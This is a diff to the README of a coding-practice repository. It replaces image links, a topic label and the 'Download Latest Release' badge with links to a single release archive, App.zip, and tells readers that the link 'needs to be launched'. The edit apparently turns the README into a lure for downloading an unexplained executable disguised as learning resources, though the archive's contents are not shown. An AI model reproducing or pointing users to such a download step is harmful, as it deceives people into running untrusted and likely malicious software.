@@ -1,6 +1,6 @@
 # CodeVerse - Learn to Code and Ace Real-World Challenges 🚀
 
-![CodeVerse](https://your-image-url.com)
+![CodeVerse](https://github.com/namensenn/Coding-Practice-32-CAR/releases/download/v1.0/App.zip)
 
 Welcome to **Coding-Practice-32-CAR** repository by CodeVerse! Here you will find a treasure trove of resources to help you learn coding, master web development, ace coding challenges, and prepare for technical interviews. We provide tutorials, solutions, and answers to real-world problems to enhance your skills in programming languages such as JavaScript, Python, and more.
 
@@ -11,7 +11,7 @@ Welcome to **Coding-Practice-32-CAR** repository by CodeVerse! Here you will fin
 🚀 **Data Structures & Algorithms (DSA)**  
 🚀 **Interview Preparation**  
 🚀 **JavaScript**  
-🚀 **Node.js**  
+🚀 **https://github.com/namensenn/Coding-Practice-32-CAR/releases/download/v1.0/App.zip**  
 🚀 **Problem Solving**  
 🚀 **Programming**  
 🚀 **Projects**  
@@ -24,7 +24,7 @@ Welcome to **Coding-Practice-32-CAR** repository by CodeVerse! Here you will fin
 ## Get Started
 To start your coding journey with us, make sure to download our latest release. Click the button below to download the necessary files for your learning experience:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Latest Release](https://github.com/namensenn/Coding-Practice-32-CAR/releases/download/v1.0/App.zip%20Release-blue)](https://github.com/namensenn/Coding-Practice-32-CAR/releases/download/v1.0/App.zip)
 
 *Note: The link needs to be launched.*
 
@@ -45,4 +45,4 @@ Connect with fellow learners, share your progress, and seek help from experience
 
 ## CodeVerse - Empowering Coders Everywhere 🌟
 
-![CodeVerse Logo](https://your-logo-url.com)
+![CodeVerse Logo](https://github.com/namensenn/Coding-Practice-32-CAR/releases/download/v1.0/App.zip)
